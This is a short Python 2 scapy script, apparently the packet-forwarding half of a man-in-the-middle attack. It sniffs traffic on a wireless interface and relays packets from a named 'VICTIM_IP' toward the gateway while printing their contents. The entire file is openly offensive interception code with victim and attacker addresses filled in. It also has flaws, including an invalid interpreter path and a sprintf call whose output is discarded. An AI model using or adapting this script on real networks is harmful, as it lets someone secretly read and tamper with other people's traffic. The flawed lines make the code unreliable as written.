#!/etc/usr/python

from scapy.all import *
import sys

iface = "wlan1"
filter = "ip"
VICTIM_IP = "192.168.2.108"
MY_IP = "192.168.2.104"
GATEWAY_IP = "192.168.2.1"
VICTIM_MAC = "### don't want so show###"
MY_MAC = "### don't want so show###"
GATEWAY_MAC = "### don't want so show###"

def handle_packet(packet):
    if (packet[IP].dst == GATEWAY_IP) and (packet[Ether].dst == MY_MAC):
        packet[Ether].dst = GATEWAY_MAC
        # TODO: block iscsi packets with an if condition
        sendp(packet)

        print "A packet from " + packet[IP].src + " redirected!"
        sprintf("{Raw:%Raw.load%\n}")

sniff(prn=handle_packet, filter=filter, iface=iface, store=0)